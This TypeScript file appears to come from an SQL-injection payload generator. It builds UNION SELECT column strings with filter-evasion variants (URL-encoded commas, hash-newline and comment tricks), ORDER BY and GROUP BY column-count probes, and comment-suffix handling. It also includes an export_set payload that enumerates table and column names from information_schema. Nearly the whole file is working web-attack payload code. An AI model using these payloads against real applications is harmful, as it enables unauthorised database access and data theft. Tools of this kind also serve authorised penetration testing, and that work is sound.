/**
 * Generates custom column strings for Union Statement templates
 * based on the user-specified column count N.
 */
export function generateUnionColumns(templateId: string, count: number): string {
  const n = Math.max(1, Math.min(count, 500)); // safe bounds between 1 and 500

  switch (templateId) {
    case 'union-select-12345': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-plus-select-12345': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION+SELECT+${cols}`;
    }
    case 'union-plus-all-plus-select-12345': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION+All+SELECT+${cols}`;
    }
    case 'union-plus-all-plus-select-null': {
      const cols = Array.from({ length: n }, () => 'null').join(',');
      return `UNION+ALL+SELECT ${cols}`;
    }
    case 'union-select-parens': {
      const cols = Array.from({ length: n }, (_, i) => `(${i + 1})`).join(',');
      return `UNION(SELECT${cols})`;
    }
    case 'union-distinctrow-select': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `Union Distinctrow Select ${cols}`;
    }
    case 'union-select-13371': {
      const cols = Array.from({ length: n }, (_, i) => 13370 + i + 1).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-encoded-comma': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join('%2c');
      return `Union Select ${cols}`;
    }
    case 'union-select-comment-newline': {
      const cols = Array.from({ length: n }, (_, i) => `${i + 1}--+%0A`).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-tilde': {
      const cols = Array.from({ length: n }, (_, i) => `~${i + 1}`).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-dot': {
      const cols = Array.from({ length: n }, (_, i) => `.${i + 1}`).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-quotes': {
      const cols = Array.from({ length: n }, (_, i) => `'${i + 1}'`).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-quad-digits': {
      const cols = Array.from({ length: n }, (_, i) => {
        const num = i + 1;
        return num < 10 ? `${num}${num}${num}${num}` : `${num}`.repeat(2);
      }).join(',');
      return `Union Select ${cols}`;
    }
    case 'union-select-char': {
      const cols = Array.from({ length: n }, (_, i) => `CHAR(${48 + i + 1})`).join(',');
      return `Union Select ${cols}`;
    }
    case 'join-select-alias': {
      const getAlias = (idx: number) => {
        let s = '';
        let num = idx;
        while (num >= 0) {
          s = String.fromCharCode(97 + (num % 26)) + s;
          num = Math.floor(num / 26) - 1;
        }
        return s;
      };
      return Array.from({ length: n }, (_, i) => `join(SELECT ${i + 1})${getAlias(i)}`).join(' ');
    }
    case 'union-select-hash-newline-bypass': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `%23%0AUnion%23aaaaaaaaaaaaaaaa%0ASelect%23%0A${cols}`;
    }
    default: {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `Union Select ${cols}`;
    }
  }
}

/**
 * Generates custom column strings for Column Count (ORDER / GROUP / NULL / INTO) templates
 * based on the user-specified column count N.
 */
export function generateOrderColumns(templateId: string, count: number): string {
  const n = Math.max(1, Math.min(count, 500)); // safe bounds between 1 and 500

  switch (templateId) {
    case 'col-count-order-by':
      return `ORDER BY ${n}`;
    case 'col-count-plus-order-by':
      return `+ORDER+BY+${n}`;
    case 'col-count-order-by-comment':
      return `ORDER BY ${n}-- -`;
    case 'col-count-plus-order-by-comment':
      return `+ORDER+BY+${n}--+`;
    case 'col-count-group-by':
      return `GROUP BY ${n}`;
    case 'col-count-plus-group-by':
      return `+GROUP+BY+${n}`;
    case 'col-count-group-by-comment':
      return `GROUP BY ${n}-- -`;
    case 'col-count-plus-group-by-comment':
      return `+GROUP+BY+${n}--+`;
    case 'col-count-union-null': {
      const nulls = Array.from({ length: n }, () => 'NULL').join(',');
      return `UNION SELECT ${nulls}`;
    }
    case 'col-count-union-null-comment': {
      const nulls = Array.from({ length: n }, () => 'NULL').join(',');
      return `UNION SELECT ${nulls}-- -`;
    }
    case 'col-count-into-vars': {
      const vars = Array.from({ length: n }, (_, i) => `@v${i + 1}`).join(',');
      return `LIMIT 1 INTO ${vars}`;
    }
    case 'col-count-select-export-set':
      return `'+AND+(SELECT * FROM (Select+export_set(${n},@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))=(SELECT 1)--+`;
    default:
      return `ORDER BY ${n}`;
  }
}

/**
 * Appends or replaces comment suffix at the end of generated SQL statements.
 * Strips existing comment terminations before appending the chosen suffix.
 */
export function applyCommentSuffix(text: string, suffix?: string): string {
  if (!suffix || suffix.trim().toLowerCase() === 'none') {
    return text;
  }

  const s = suffix.trim();

  // Strip existing trailing comments if already present in template
  let cleaned = text.trim();
  const trailingPatterns = [
    /\s*--\s*-\s*$/,
    /\s*--\+\s*$/,
    /\s*%23%0a\s*$/i,
    /\s*%23\s*$/,
    /\s*--%0a\s*$/i,
    /\s*#\s*$/,
    /\s*\/\*!\s*--\+\s*\*\/$/i,
    /\s*\/\*\s*$/,
    /\s*;%00\s*$/i
  ];

  for (const pattern of trailingPatterns) {
    if (pattern.test(cleaned)) {
      cleaned = cleaned.replace(pattern, '').trim();
      break;
    }
  }

  // Smart formatting:
  // If suffix starts with quotes or parenthesis closer (e.g. '--+, ")--+, )--+), attach directly without space
  if (s.startsWith("'") || s.startsWith('"') || s.startsWith(')')) {
    return `${cleaned}${s}`;
  }

  // If suffix starts with block comment /*
  if (s.startsWith('/*')) {
    return `${cleaned}/*`;
  }

  // Standard keyword / comment suffix with space (e.g. '--+', '-- -', 'ASC --+', '#', '%23')
  return `${cleaned} ${s}`;
}

